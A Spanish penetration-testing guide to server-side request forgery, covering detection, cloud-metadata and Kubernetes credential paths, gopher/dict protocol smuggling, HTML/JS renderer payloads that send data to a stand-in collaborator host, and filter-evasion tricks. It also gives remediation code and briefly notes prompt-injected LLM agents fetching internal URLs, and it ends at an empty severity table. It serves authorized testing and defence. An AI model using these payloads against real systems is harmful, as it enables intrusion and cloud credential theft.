# Falsificación de peticiones del lado del servidor (SSRF, Server-Side Request Forgery)

| Clasificación | |
|---|---|
| CWE | CWE-918 — Server-Side Request Forgery (SSRF); relacionadas: CWE-441 — Unintended Proxy or Intermediary; CWE-611 (XXE como vector) |
| OWASP Top 10:2025 | A01 — Broken Access Control (en 2025 SSRF se integra en esta categoría) |
| OWASP API Top 10:2023 | API7:2023 — Server Side Request Forgery |
| WSTG | WSTG-INPV-19 (Testing for Server-Side Request Forgery) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura (OAST, oráculos de error y tiempo) · 4. Explotación por contexto (localhost y red interna, metadatos cloud AWS/GCP/Azure/OCI/otros, Kubernetes y contenedores, SSRF ciega, contrabando de protocolos gopher/dict/file, renderizadores PDF/HTML, webhooks, otros vectores) · 5. Evasión (representaciones de IP, confusión de parsers, redirecciones, DNS rebinding) · 6. Escalada y encadenamiento · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

Una **SSRF** aparece cuando la aplicación hace una petición de red (normalmente HTTP, pero también otros protocolos) hacia un destino que el usuario controla total o parcialmente. El servidor actúa entonces como un **proxy involuntario**: la petición sale desde su posición en la red, con su confianza y sus credenciales, y puede alcanzar destinos que el atacante no ve desde Internet:

- `localhost` y servicios que solo escuchan en la interfaz de bucle local (*loopback*): paneles de administración, Redis, Elasticsearch, actuators de Spring, APIs de depuración.
- La red interna (rangos privados RFC 1918 `10/8`, `172.16/12`, `192.168/16`, y redes de servicio de Kubernetes).
- El **servicio de metadatos de instancia** (IMDS, *Instance Metadata Service*): un endpoint HTTP que cada proveedor cloud expone en una IP local de enlace (`169.254.169.254`) y que entrega, entre otras cosas, **credenciales temporales** del rol asociado a la máquina.
- Sistemas externos, usando el servidor como origen "de confianza" (listas blancas por IP, abuso de recursos).

Tipos según lo que vuelve al atacante:

- **SSRF con respuesta completa**: el contenido obtenido se devuelve en la respuesta (vista previa, importación, conversión).
- **SSRF semiciega**: solo se ve un código de estado, un mensaje de error, el tamaño o el tiempo de respuesta.
- **SSRF ciega**: no vuelve nada; se confirma con **OAST** (*Out-of-band Application Security Testing*: el servidor contacta con un dominio del auditor y se registra la interacción DNS/HTTP).

Causas habituales: funciones legítimas de "traer una URL" sin restringir el destino; validar la cadena de la URL en lugar de la **IP resuelta**; seguir redirecciones sin revalidar; usar dos parsers distintos (uno para validar y otro para pedir); la diferencia de tiempo entre validar y conectar (TOCTOU, *time-of-check to time-of-use*), que habilita el DNS rebinding; y clientes HTTP que aceptan esquemas peligrosos (`file://`, `gopher://`).

## 2. Dónde buscar (señales del reconocimiento)

**Parámetros con nombres sospechosos** (query, cuerpo JSON/XML, cabeceras, campos ocultos):

```
url uri link href src source dest destination target redirect return returnUrl next continue
callback webhook webhook_url endpoint api host domain site server proxy fetch load import
feed rss image image_url img_url avatar avatar_url icon logo logo_uri media_url file document
pdf preview oembed jwks_uri request_uri sector_identifier_uri metadata_url openid_configuration
```

**Funcionalidades** que casi siempre hacen peticiones del lado del servidor:

- Webhooks e integraciones ("prueba de conexión", "enviar evento de prueba"), con registro de entregas que muestra la respuesta.
- Importar desde URL (CSV, iCal, imágenes, OpenAPI, Git, SVG), "subir desde URL", avatar por URL.
- Vista previa de enlaces (*unfurl*, Open Graph/oEmbed) en chats, comentarios, CRMs.
- Generación de PDF, capturas de pantalla, exportación de informes desde HTML (wkhtmltopdf, Puppeteer/Playwright, WeasyPrint, dompdf, Gotenberg, PrinceXML).
- Proxies de imagen y redimensionado: `/_next/image?url=`, imgproxy, Thumbor, Cloudinary *fetch*, funciones Lambda de miniaturas.
- OIDC/OAuth: registro dinámico de clientes (`jwks_uri`, `logo_uri`, `sector_identifier_uri`, `request_uri`), descubrimiento (`.well-known/openid-configuration`), metadatos SAML por URL.
- Parsers XML (XXE con entidades externas), SVG, documentos Office (`.docx/.xlsx` contienen XML), FFmpeg con listas HLS.
- Agentes LLM con herramientas de navegación o "leer esta URL" (ver `vulns/llm-ai.md`).
- Cabeceras que el backend usa para construir URLs: `Host`, `X-Forwarded-Host`, `Referer` (analítica que visita el referente) — ver `vulns/host-header.md`.

**Señales en respuestas**: tiempos que cambian según el host indicado; errores como `Connection refused`, `getaddrinfo ENOTFOUND`, `Name or service not known`, `No route to host`, `cURL error 7`, `java.net.ConnectException`; aparición en tu listener de un `User-Agent` de servidor (`python-requests/2.x`, `Go-http-client/1.1`, `axios/1.x`, `Java/17`, `curl/8.x`, `node-fetch`, `HeadlessChrome`).

## 3. Detección segura (primeras sondas, no destructivas)

1. **Línea base**: envía una URL externa legítima y observa respuesta, tiempo y tamaño.
2. **OAST con identificador único por parámetro** (para saber qué parámetro disparó la interacción):

   ```
   https://p-url-01.<id>.oast.example/
   http://p-webhook-02.<id>.oast.example/x.png
   //p-avatar-03.<id>.oast.example/
   ```

   Distingue **solo DNS** (el servidor resolvió el nombre pero quizá no tiene salida HTTP, o lo resolvió un filtro/antivirus) de **DNS + HTTP** (petición real). Anota IP de origen, `User-Agent` y cabeceras recibidas. Por confidencialidad del cliente, prefiere Burp Collaborator privado o un `interactsh` autoalojado.

3. **Oráculo de diferencias** (SSRF semiciega): compara respuestas para destinos internos con comportamientos conocidos:

   ```
   http://127.0.0.1:80/          # puerto típicamente abierto
   http://127.0.0.1:22/          # servicio no HTTP: error distinto o respuesta rápida
   http://127.0.0.1:1/           # puerto cerrado: "connection refused" inmediato
   http://10.255.255.1/          # IP no enrutable: timeout largo
   http://nonexistent.invalid/   # fallo de resolución DNS
   ```

   Si los cuatro casos producen respuestas/tiempos distintos, tienes un oráculo para mapear la red interna.

4. **Esquemas soportados** (solo lectura de algo inocuo):

   ```
   file:///etc/hostname
   file:///c:/windows/win.ini
   dict://<id>.oast.example:80/
   gopher://<id>.oast.example:80/_GET%20/gopher-probe%20HTTP/1.0%0d%0a%0d%0a
   ```

5. **¿Sigue redirecciones?** Sirve una redirección desde tu servidor hacia tu OAST y comprueba si llega la segunda petición:

   ```python
   # redir.py — servidor de redirección mínimo (solo para pruebas autorizadas)
   import http.server, sys
   TARGET, CODE = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 302
   class H(http.server.BaseHTTPRequestHandler):
       def _r(self):
           self.send_response(CODE); self.send_header("Location", TARGET); self.end_headers()
       do_GET = do_POST = do_PUT = do_HEAD = _r
   http.server.HTTPServer(("0.0.0.0", 8080), H).serve_forever()
   # python3 redir.py "http://p-redir.<id>.oast.example/ok" 307
   ```

## 4. Explotación por contexto o tecnología

### 4.1 Localhost y red interna

```
http://127.0.0.1/            http://localhost/            http://[::1]/
http://0.0.0.0/              http://0/                    http://127.1/
http://127.0.0.1:8080/admin  http://localhost:8500/v1/agent/self
http://intranet/ http://jenkins.internal/ http://gitlab.internal/-/readiness
```

Puertos y rutas internas de alto valor (solo lectura):

| Servicio | Sonda inocua |
|---|---|
| Spring Boot Actuator | `http://127.0.0.1:8080/actuator`, `/actuator/env`, `/actuator/mappings` |
| Elasticsearch / OpenSearch | `http://127.0.0.1:9200/`, `/_cat/indices` |
| Consul | `http://127.0.0.1:8500/v1/agent/self` |
| etcd | `http://127.0.0.1:2379/version` |
| Docker Engine API | `http://127.0.0.1:2375/version`, `/containers/json` |
| Kubelet | `https://127.0.0.1:10250/pods` (suele exigir autenticación), `http://127.0.0.1:10255/pods` (puerto de solo lectura, heredado) |
| Prometheus | `http://127.0.0.1:9090/api/v1/targets` |
| Envoy/Istio admin | `http://127.0.0.1:15000/config_dump`, `/clusters` |
| Redis (vía dict) | `dict://127.0.0.1:6379/INFO` |
| Memcached (vía dict) | `dict://127.0.0.1:11211/stats` |
| Solr | `http://127.0.0.1:8983/solr/admin/cores?action=STATUS` |
| Grafana / Kibana | `http://127.0.0.1:3000/api/health`, `http://127.0.0.1:5601/api/status` |

Barrido de puertos por oráculo: usa Burp Intruder o `ffuf` con una lista corta de puertos (no 65 535) y limita la velocidad.

```bash
ffuf -u 'https://target/api/preview?url=http://127.0.0.1:FUZZ/' \
  -w ports-top100.txt -rate 5 -mc all -fs <tam_respuesta_cerrado> -o ssrf-ports.json
```

### 4.2 Metadatos cloud

Prueba mínima de impacto: lee identificadores no secretos (`instance-id`, nombre del rol, proyecto). Lee credenciales solo si las reglas de compromiso lo permiten; en ese caso redáctalas en el informe y demuestra su validez con una llamada de **solo lectura de identidad** (`aws sts get-caller-identity`), nunca con acciones sobre recursos.

**AWS EC2 — IMDSv1** (sin token; si responde, ya es un hallazgo de configuración):

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<NOMBRE_ROL>
http://169.254.169.254/latest/user-data                     # a menudo contiene secretos de arranque
http://169.254.169.254/latest/dynamic/instance-identity/document
http://[fd00:ec2::254]/latest/meta-data/                    # endpoint IPv6 (Nitro, si está habilitado)
```

**AWS — IMDSv2** (requiere un `PUT` para obtener token y enviarlo en cabecera). Solo es explotable si la SSRF permite elegir método y cabeceras (webhooks configurables, proxies genéricos, gateways), o mediante una redirección `307/308` que conserve el `PUT`:

```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: <TOKEN>
```

Notas: IMDS rechaza el `PUT` de token si lleva `X-Forwarded-For` (bloquea muchos proxies); el *hop limit* (TTL de la respuesta, 1 por defecto en muchas AMIs) impide que contenedores con red en puente lo alcancen.

**AWS — otros entornos**:

```
http://169.254.170.2/v2/metadata                              # ECS task metadata
http://169.254.170.2<AWS_CONTAINER_CREDENTIALS_RELATIVE_URI>  # credenciales de la tarea ECS (ruta en /proc/self/environ)
http://169.254.170.23/v1/credentials                          # EKS Pod Identity (requiere token del fichero indicado en AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE)
file:///proc/self/environ                                     # Lambda: credenciales en variables de entorno
http://127.0.0.1:9001/2018-06-01/runtime/invocation/next      # Lambda Runtime API (valor real en AWS_LAMBDA_RUNTIME_API) ⚠️ consume el siguiente evento
```

**Google Cloud** (requiere `Metadata-Flavor: Google`; el antiguo `v1beta1` sin cabecera está retirado, si responde es un hallazgo):

```
http://metadata.google.internal/computeMetadata/v1/?recursive=true
http://169.254.169.254/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true   # puede incluir kube-env en GKE antiguos
```

**Azure** (requiere `Metadata: true` y `api-version`; rechaza peticiones con `X-Forwarded-For`):

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# App Service / Functions: identidad gestionada en IDENTITY_ENDPOINT con cabecera X-IDENTITY-HEADER (ambos en variables de entorno)
```

**Otros proveedores**:

```
http://169.254.169.254/opc/v2/instance/            # Oracle Cloud (cabecera Authorization: Bearer Oracle); v1 sin cabecera en instancias antiguas
http://100.100.100.200/latest/meta-data/           # Alibaba Cloud
http://169.254.169.254/metadata/v1.json            # DigitalOcean
http://169.254.169.254/openstack/latest/meta_data.json   # OpenStack
http://169.254.169.254/metadata/v1/                # Equinix Metal
```

Si la SSRF no permite fijar cabeceras, GCP y Azure suelen ser inalcanzables; AWS IMDSv1 y Alibaba no las exigen.

### 4.3 Kubernetes y contenedores

```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
https://kubernetes.default.svc/version                    # descubre la API del clúster
http://<servicio>.<namespace>.svc.cluster.local:<puerto>/  # descubrimiento por DNS interno
```

Con un token de *service account* (solo si las reglas lo permiten), enumera permisos con una consulta de solo lectura: `kubectl auth can-i --list --token="$T" --server=https://<api>` (la API hace una `SelfSubjectRulesReview`, que no modifica nada).

Sockets Unix (solo si el cliente los admite, p. ej. curl con `--unix-socket` o librerías con esquema `unix:`): `/var/run/docker.sock` (`GET /version`), `/run/containerd/containerd.sock`.

### 4.4 SSRF ciega: confirmar y extraer señal

- Confirmación: OAST con DNS + HTTP y huella de cliente (`User-Agent`, versión TLS, IP de salida del cliente).
- Mapeo interno: oráculo de tiempos o de errores (§3). Para resoluciones internas, usa nombres internos conocidos (`http://jenkins/`, `http://gitlab/`) y compara tiempos.
- Exfiltración indirecta: si un servicio interno vulnerable refleja datos y hace a su vez peticiones (p. ej. un *render* que visita otra URL), encadena hacia tu OAST.
- Fuga de cabeceras: algunos clientes reenvían `Authorization`, cookies o tokens internos a tu servidor; revisa todas las cabeceras recibidas.

### 4.5 Contrabando de protocolos (gopher, dict, file y otros)

**Contrabando de protocolos** (*protocol smuggling*): usar un esquema que permite enviar bytes arbitrarios por TCP para hablar con servicios no HTTP.

```
file:///etc/passwd                     # lectura local (cURL, urllib de Python, PHP, Java URL)
file://localhost/etc/hostname
dict://127.0.0.1:6379/INFO             # dict envía una línea: útil para banners y comandos de una línea
gopher://127.0.0.1:6379/_INFO%0d%0aQUIT%0d%0a    # gopher envía bytes arbitrarios tras el "_"
ldap://127.0.0.1:389/   tftp://<oast>:69/x   sftp://<oast>:22/   (según soporte de libcurl)
jar:http://<oast>/x.zip!/a.txt          # Java: descarga y abre ZIP (útil para OAST y subidas temporales)
netdoc:///etc/passwd                    # Java antiguo
php://filter/convert.base64-encode/resource=/etc/passwd   # PHP: file_get_contents con URL del usuario
```

Construir una petición HTTP interna con `gopher` (útil para hacer `POST` a un servicio interno):

```python
# gopher_http.py — genera gopher://host:port/_<bytes>
import urllib.parse, sys
host, port, path, body = "127.0.0.1", 8080, "/internal/api/ping", "a=1"
raw = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
       f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n"
       f"Connection: close\r\n\r\n{body}")
print(f"gopher://{host}:{port}/_" + urllib.parse.quote(raw, safe=""))
# Si el parámetro se decodifica una vez antes de llegar al cliente, aplica una segunda codificación.
```

⚠️ Escritura en Redis/Memcached, envío de correo vía SMTP, consultas MySQL/PostgreSQL o FastCGI con `gopher` (Gopherus) modifican estado o ejecutan código: **requiere confirmación explícita del cliente**. Como prueba inocua usa comandos de solo lectura (`INFO`, `PING`, `stats`).

Inyección CRLF en la URL: clientes antiguos permitían `\r\n` en la ruta y con ello inyectar cabeceras o una segunda petición (p. ej. `urllib` de Python, CVE-2019-9740). Prueba `http://127.0.0.1:6379/%0d%0aPING%0d%0a` solo con comandos inocuos.

### 4.6 Renderizadores PDF/HTML y navegadores sin interfaz

Si el usuario controla HTML (o Markdown/plantillas) que se convierte en PDF o captura de pantalla, el motor carga recursos desde el servidor:

```html
<iframe src="http://169.254.169.254/latest/meta-data/" width="900" height="600"></iframe>
<img src="http://p-pdf.<id>.oast.example/img.png">
<link rel="stylesheet" href="http://p-css.<id>.oast.example/x.css">
<object data="file:///etc/hostname" type="text/plain" width="900" height="200"></object>
<meta http-equiv="refresh" content="0;url=file:///etc/hostname">
<!-- Motores con JavaScript (Chrome headless, Puppeteer, Playwright, wkhtmltopdf antiguo): -->
<script>
fetch('http://169.254.169.254/latest/meta-data/instance-id')
 .then(r=>r.text()).then(t=>{document.body.innerText=t; new Image().src='//p-js.<id>.oast.example/?d='+encodeURIComponent(t)});
</script>
<!-- wkhtmltopdf con acceso local habilitado: -->
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/hostname');x.send();</script>
<!-- WeasyPrint: adjunta el fichero dentro del PDF (extráelo con un lector de adjuntos) -->
<link rel="attachment" href="file:///etc/hostname">
<!-- SVG con foreignObject en conversores SVG→PDF/PNG -->
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="800" height="500"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="http://127.0.0.1:8080/" width="800" height="500"></iframe></body></foreignObject></svg>
```

Identifica el motor por el `User-Agent` en tu OAST o por los metadatos del PDF (`exiftool salida.pdf` → `Producer`/`Creator`). Casos conocidos: dompdf con carga de fuentes remotas (CVE-2022-28368), Chrome headless con `--disable-web-security` o sin aislamiento de red.

### 4.7 Webhooks

- Registra webhooks hacia `http://127.0.0.1:<puerto>/`, rangos privados y metadatos; usa "enviar prueba" y revisa el **registro de entregas** (suele mostrar código y cuerpo de respuesta → SSRF con respuesta).
- Si la validación se hace al guardar pero no al enviar, usa un dominio propio que cambie su registro DNS después (rebinding lento) o una redirección.
- Si puedes elegir método y cabeceras, prueba el flujo IMDSv2 (§4.2).
- Comprueba reintentos (amplificación) y tiempos de espera largos (agotamiento de *workers*), sin forzar DoS.

### 4.8 Otros vectores

- **XXE**: `<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">` (ver `vulns/xxe.md`).
- **SVG/imagen subida** procesada en servidor con `xlink:href` remoto (ver `vulns/file-upload.md`).
- **OIDC registro dinámico**: `logo_uri`, `jwks_uri`, `sector_identifier_uri`, `request_uri` apuntando a destinos internos (ver `vulns/oauth-oidc-saml.md`).
- **Next.js `/_next/image`**: si `images.remotePatterns` admite `**` o dominios con redirecciones abiertas, `/_next/image?url=https://dominio-permitido/redirect?to=http://169.254.169.254/&w=64&q=75`.
- **FFmpeg / HLS**: listas `.m3u8` con segmentos `http://` o `file://` procesadas al generar miniaturas.
- **Host header routing**: el proxy enruta según `Host` hacia redes internas (ver `vulns/host-header.md`).
- **LLM con herramientas**: el modelo visita URLs internas por inyección de prompt (ver `vulns/llm-ai.md`).

## 5. Evasión de filtros y WAF

**Representaciones alternativas de `127.0.0.1`**:

```
127.1  127.0.1  127.000.000.001  0177.0.0.1  0x7f.0.0.1  0x7f000001  2130706433  017700000001
0  0.0.0.0  127.127.127.127  127.0.0.2  [::1]  [::]  [0:0:0:0:0:0:0:1]  [::ffff:127.0.0.1]  [::ffff:7f00:1]
localhost  LOCALHOST  localhost.  ⓛⓞⓒⓐⓛⓗⓞⓢⓣ  127.0.0.1.nip.io  localtest.me  <subdominio-propio-con-A-127.0.0.1>
```

**Representaciones de `169.254.169.254`**:

```
2852039166  0xa9fea9fe  0xa9.0xfe.0xa9.0xfe  0251.0376.0251.0376  169.254.43518
[::ffff:169.254.169.254]  [::ffff:a9fe:a9fe]  169.254.169.254.nip.io  instance-data (alias DNS interno en EC2)
```

**Confusión de parsers de URL** (validador y cliente interpretan distinto el host):

```
http://allowed.com@127.0.0.1/            # userinfo: el host real es 127.0.0.1
http://127.0.0.1#@allowed.com/            # fragmento
http://127.0.0.1\@allowed.com/            # barra invertida tratada distinto por WHATWG y RFC 3986
http://allowed.com.127.0.0.1.nip.io/      # validación con startsWith/contains
http://127.0.0.1:80\@@allowed.com:80/
http://allowed.com:80#@127.0.0.1/
https://evil.example/?https://allowed.com # validación con contains
//127.0.0.1/   http:/127.0.0.1/   http:\\127.0.0.1\   HtTp://127.0.0.1/   http:////127.0.0.1/
http://127.0.0.1%2523@allowed.com/        # doble codificación de '#'
http://[::ffff:127.0.0.1]:80/  http://[fe80::1%25eth0]/   # IPv6 con zona
```

**Redirecciones**: si solo se valida la URL inicial, sirve un `302/307` desde un dominio permitido o propio hacia el destino interno (ver script de §3). Busca redirecciones abiertas en dominios de la lista blanca (ver `vulns/open-redirect.md`). `307/308` conservan método y cuerpo.

**DNS rebinding**: el nombre se resuelve primero a una IP pública (pasa la validación) y, en la segunda resolución (la conexión real), a una IP interna. Requiere TTL bajo y que el código resuelva dos veces.

```
7f000001.c0a80001.rbndr.us        # rbndr: alterna entre las dos IPs codificadas en hexadecimal
                                   # (127.0.0.1 y 192.168.0.1 en este ejemplo; usa una IP pública tuya + la interna)
```

Herramientas: Singularity of Origin (NCC Group) autoalojado, rbndr, servidores DNS propios con TTL 0. Repite varias veces: el éxito es probabilístico.

**Otros trucos**: dominios propios con registro `A` a IP interna; registros `AAAA` solo IPv6 cuando el filtro solo mira IPv4; acortadores de URL (si se permiten); codificación URL simple/doble de puntos y letras (`127%2e0%2e0%2e1`, `%6c%6f%63%61%6c%68%6f%73%74`); mayúsculas en el esquema; puertos alternativos; `0.0.0.0` (en Linux conecta a la máquina local).

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

| Cadena | Demostración segura |
|---|---|
| SSRF → IMDS → credenciales cloud | Nombre del rol + `aws sts get-caller-identity` con las credenciales (solo identidad). No listes buckets ni toques recursos sin permiso |
| SSRF → actuator/consola interna | `/actuator/env` o `/actuator/mappings` (redacta secretos). ⚠️ `/actuator/heapdump` descarga memoria con secretos: requiere confirmación explícita del cliente |
| SSRF → token de Kubernetes | Leer `namespace` y validar el token con `auth can-i --list` (solo lectura) |
| SSRF → Redis/Memcached/FastCGI (gopher) → RCE | `INFO`/`PING`. ⚠️ Escritura de clave, `CONFIG SET`, módulos o crontab: requiere confirmación explícita del cliente |
| SSRF → Docker API | `GET /version`, `/containers/json`. ⚠️ Crear/arrancar contenedores: requiere confirmación explícita del cliente |
| SSRF → servicio interno vulnerable (Jenkins, Solr, Confluence, GitLab) | Huella de versión y referencia a la vulnerabilidad pública; no ejecutar exploits sin autorización |
| SSRF en Windows → fuga NTLM | `file://<IP-auditor>/share/x` o `\\<IP-auditor>\share` capturando el hash con Responder. ⚠️ Captura y relay de credenciales: requiere confirmación explícita del cliente |
| SSRF + XSS/HTML → PDF | Leer `file:///etc/hostname` como prueba, no ficheros con secretos |
| Open redirect + SSRF con lista blanca | Encadenar la redirección del dominio permitido hacia OAST |

## 7. Caja blanca: fuentes, sumideros y patrones de código

**Fuentes**: cualquier entrada del usuario que acabe en una URL, host o puerto (query, JSON, cabeceras `Host`/`X-Forwarded-Host`, ficheros subidos con referencias, configuración de webhooks guardada en BD). **Sumideros**: clientes HTTP y funciones que abren URLs.

**PHP**

```php
// VULNERABLE: file_get_contents acepta file://, php://, http://; getimagesize() también abre URLs
$data = file_get_contents($_GET['url']);
$ch = curl_init($_POST['webhook']); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_exec($ch);

// SEGURO: esquema http/https, IP resuelta validada y fijada, sin redirecciones
$u = parse_url($url);
if (!in_array(strtolower($u['scheme'] ?? ''), ['http','https'], true)) throw new Exception('scheme');
$ip = gethostbyname($u['host']);
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) throw new Exception('ip');
$port = $u['port'] ?? ($u['scheme'] === 'https' ? 443 : 80);
curl_setopt_array($ch, [
  CURLOPT_PROTOCOLS_STR => 'http,https', CURLOPT_FOLLOWLOCATION => false,
  CURLOPT_RESOLVE => ["{$u['host']}:$port:$ip"],   // evita el rebinding: se conecta a la IP validada
  CURLOPT_TIMEOUT => 5,
]);
```

**Java / Spring**

```java
// VULNERABLE
String body = restTemplate.getForObject(request.getParameter("url"), String.class);
InputStream in = new URL(userUrl).openStream();          // admite file:, jar:
BufferedImage img = ImageIO.read(new URL(userUrl));
Document d = Jsoup.connect(userUrl).get();

// SEGURO: validar todas las IPs resueltas (y conectar a la validada)
InetAddress[] addrs = InetAddress.getAllByName(uri.getHost());
for (InetAddress a : addrs) {
  if (a.isLoopbackAddress() || a.isSiteLocalAddress() || a.isLinkLocalAddress()
      || a.isAnyLocalAddress() || a.isMulticastAddress()) throw new SecurityException("blocked");
}
// Además: solo http/https, sin seguir redirecciones (HttpClient.Redirect.NEVER), y preferiblemente salida a través de un proxy de egress.
```

**Python / Django / Flask**

```python
# VULNERABLE
r = requests.get(request.args["url"])                 # sigue redirecciones por defecto
urllib.request.urlopen(request.json["feed"])           # admite file://

# SEGURO (ver función completa en §11)
safe_fetch(request.args["url"])  # esquema, resolución, validación de cada IP, sin redirecciones
```

**Node / Express**

```js
// VULNERABLE
app.get('/preview', async (req, res) => res.send((await axios.get(req.query.url)).data));
// axios con baseURL: una URL absoluta sustituye la base (CVE-2025-27152, corregido en 1.8.2);
// URLs relativas al protocolo en axios 1.3.2–1.7.3 (CVE-2024-39338).

// SEGURO: validar la IP en el momento de conectar (resuelve el rebinding)
const dns = require('dns'), http = require('http'), https = require('https'), ipaddr = require('ipaddr.js');
const ok = a => ipaddr.process(a).range() === 'unicast';
function lookup(host, opts, cb) {
  dns.lookup(host, { ...opts, all: true }, (err, list) => {
    if (err) return cb(err);
    if (!list.every(e => ok(e.address))) return cb(new Error('blocked address'));
    opts.all ? cb(null, list) : cb(null, list[0].address, list[0].family);
  });
}
const agent = { http: new http.Agent({ lookup }), https: new https.Agent({ lookup }) };
await axios.get(url, { httpAgent: agent.http, httpsAgent: agent.https, maxRedirects: 0, timeout: 5000 });
```

**.NET**

```csharp
// VULNERABLE
var html = await new HttpClient().GetStringAsync(Request.Query["url"]);

// SEGURO: SocketsHttpHandler.ConnectCallback valida la IP real de conexión
var handler = new SocketsHttpHandler {
  AllowAutoRedirect = false,
  ConnectCallback = async (ctx, ct) => {
    var ips = await Dns.GetHostAddressesAsync(ctx.DnsEndPoint.Host, ct);
    var ip = ips.FirstOrDefault(IsPublic) ?? throw new HttpRequestException("blocked");
    var s = new Socket(SocketType.Stream, ProtocolType.Tcp);
    await s.ConnectAsync(new IPEndPoint(ip, ctx.DnsEndPoint.Port), ct);
    return new NetworkStream(s, ownsSocket: true);
  }
};
```

**Go**

```go
// VULNERABLE
resp, _ := http.Get(r.URL.Query().Get("url"))

// SEGURO: Control se ejecuta con la IP ya resuelta, justo antes de conectar
dialer := &net.Dialer{Timeout: 5 * time.Second, Control: func(network, address string, c syscall.RawConn) error {
    host, _, _ := net.SplitHostPort(address)
    ip := net.ParseIP(host)
    if ip == nil || ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsUnspecified() || ip.IsMulticast() {
        return errors.New("blocked destination")
    }
    return nil
}}
client := &http.Client{
    Transport:     &http.Transport{DialContext: dialer.DialContext, Proxy: nil},
    CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
}
```

**Ruby / Rails**

```ruby
# VULNERABLE: Kernel#open con "|cmd" ejecuta comandos; URI.open sigue redirecciones
data = URI.open(params[:url]).read
Net::HTTP.get(URI(params[:url]))

# SEGURO: gema ssrf_filter (resuelve, valida y fija la IP, sin redirecciones a privadas)
response = SsrfFilter.get(params[:url])
```

**Búsqueda con ripgrep**

```bash
rg -n --pcre2 '\b(file_get_contents|fopen|getimagesize|curl_init|SoapClient)\s*\(|CURLOPT_URL' -g '*.php'
rg -n --pcre2 'requests\.(get|post|put|head|request)\(|urlopen\(|httpx\.(get|post|AsyncClient|Client)|aiohttp\.ClientSession|pycurl' -g '*.py'
rg -n --pcre2 'axios(\.(get|post|request))?\(|\bfetch\(|got\(|needle\(|https?\.get\(|undici\.request' -g '*.{js,ts,mjs}'
rg -n --pcre2 'new URL\(|openConnection\(|openStream\(|RestTemplate|WebClient|HttpClient\.newHttpClient|Jsoup\.connect|ImageIO\.read' -g '*.{java,kt}'
rg -n --pcre2 'http\.(Get|Post|Head|NewRequest(WithContext)?)\(' -g '*.go'
rg -n --pcre2 'HttpClient\b|WebRequest\.Create|WebClient\(|DownloadString' -g '*.cs'
rg -n --pcre2 'Net::HTTP|URI\.open|open-uri|HTTParty|Faraday|RestClient' -g '*.rb'
rg -n -i 'remotePatterns|webhook|callback_url|jwks_uri|logo_uri' .
```

**Semgrep** (reglas de registro + regla de *taint* propia)

```bash
semgrep --config p/security-audit --config p/owasp-top-ten .
```

```yaml
rules:
  - id: corvus-ssrf-flask-requests
    mode: taint
    languages: [python]
    severity: WARNING
    message: URL controlada por el usuario llega a un cliente HTTP (posible SSRF)
    pattern-sources:
      - pattern: flask.request.args.get(...)
      - pattern: flask.request.form.get(...)
      - pattern: flask.request.get_json()
    pattern-sinks:
      - patterns:
          - pattern-either:
              - pattern: requests.$M($U, ...)
              - pattern: urllib.request.urlopen($U, ...)
              - pattern: httpx.$M($U, ...)
          - focus-metavariable: $U
```

## 8. Falsos positivos frecuentes

- **Interacción OAST de un tercero**: bots de vista previa (Slack, Teams), escáneres de correo, antivirus, WAF o CDN que visitan la URL. Verifica IP de origen (ASN del cliente o de su cloud) y `User-Agent`.
- **Solo DNS**: la resolución no prueba la petición; puede venir de un validador o de un *prefetch*. Repórtalo como indicio, no como SSRF confirmada.
- **La petición la hace el navegador**, no el servidor (imagen cargada en el cliente): la IP de origen es la tuya.
- **Función que debe traer URLs externas** y lo hace correctamente bloqueando destinos internos: sin acceso interno ni a metadatos, el impacto suele ser bajo (abuso como proxy, escaneo externo).
- **Diferencias de tiempo por ruido de red**: repite cada sonda varias veces y compara medianas.
- **Respuesta "interna" que en realidad es una página de error del propio proxy** o del WAF.

## 9. Evidencia mínima para validarlo

- Petición completa (endpoint, parámetro, payload) y respuesta, con fecha y hora.
- Para SSRF ciega: registro OAST (DNS y HTTP) con identificador único, IP de origen atribuible al cliente y `User-Agent`.
- Para acceso interno: fragmento de contenido no sensible que solo existe dentro (p. ej. `instance-id`, versión de un servicio interno, `hostname`), con secretos redactados.
- Para metadatos con credenciales: nombre del rol y salida de `sts get-caller-identity` (ARN), con claves enmascaradas; indica que se descartaron.
- Payload de evasión exacto si fue necesario y la defensa que se eludió.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario demostrado | CVSS 3.1 | CVSS 4.0 (vector) |
|---|---|---|
